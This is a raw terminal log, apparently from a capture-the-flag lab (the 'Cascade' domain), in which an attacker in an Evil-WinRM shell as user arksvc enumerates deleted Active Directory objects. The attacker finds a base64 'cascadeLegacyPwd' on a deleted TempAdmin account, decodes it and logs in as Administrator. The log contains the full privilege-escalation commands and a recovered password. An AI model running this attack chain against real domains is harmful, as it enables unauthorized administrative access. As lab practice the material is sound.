*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami

wcascade\arksvc
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted objects"' -IncludeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
CN                              : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
codePage                        : 0
countryCode                     : 0
Created                         : 1/9/2020 7:30:19 PM
createTimeStamp                 : 1/9/2020 7:30:19 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       : True
LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
localPolicyFlags                : 0
logonCount                      : 0
Modified                        : 1/28/2020 6:08:35 PM
modifyTimeStamp                 : 1/28/2020 6:08:35 PM
msDS-LastKnownRDN               : CASC-WS1
Name                            : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : computer
ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132230718192147073
sAMAccountName                  : CASC-WS1$
sDRightsEffective               : 0
userAccountControl              : 4128
uSNChanged                      : 245849
uSNCreated                      : 24603
whenChanged                     : 1/28/2020 6:08:35 PM
whenCreated                     : 1/9/2020 7:30:19 PM

CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
CN                              : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
Created                         : 1/13/2020 5:21:53 PM
createTimeStamp                 : 1/13/2020 5:21:53 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
groupType                       : -2147483644
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local
Modified                        : 1/28/2020 6:07:55 PM
modifyTimeStamp                 : 1/28/2020 6:07:55 PM
msDS-LastKnownRDN               : Scheduled Tasks
Name                            : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : group
ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
ProtectedFromAccidentalDeletion : False
sAMAccountName                  : Scheduled Tasks
sDRightsEffective               : 0
uSNChanged                      : 245848
uSNCreated                      : 114790
whenChanged                     : 1/28/2020 6:07:55 PM
whenCreated                     : 1/13/2020 5:21:53 PM

CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
Created                         : 1/26/2020 2:34:30 AM
createTimeStamp                 : 1/26/2020 2:34:30 AM
Deleted                         : True
Description                     :
DisplayName                     : Block Potato
DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
flags                           : 0
gPCFileSysPath                  : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA}
gPCFunctionalityVersion         : 2
gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}
Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : groupPolicyContainer
ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196701
uSNCreated                      : 196688
versionNumber                   : 2
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:30 AM

CanonicalName                   : cascade.local/Deleted Objects/Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
CN                              : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : Machine
Name                            : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196699
uSNCreated                      : 196689
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

CanonicalName                   : cascade.local/Deleted Objects/User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
CN                              : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/1/1601 12:00:00 AM}
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : User
Name                            : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM

.
.
.
// cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
.
.
.
*Evil-WinRM* PS C:\Users\arksvc\Documents> exit

Info: Exiting with code 0

allenwest1@debian:~/Desktop$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
allenwest1@debian:~/Desktop$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
.
.
.
// Continued in asAdministrator.bash
.
.
.





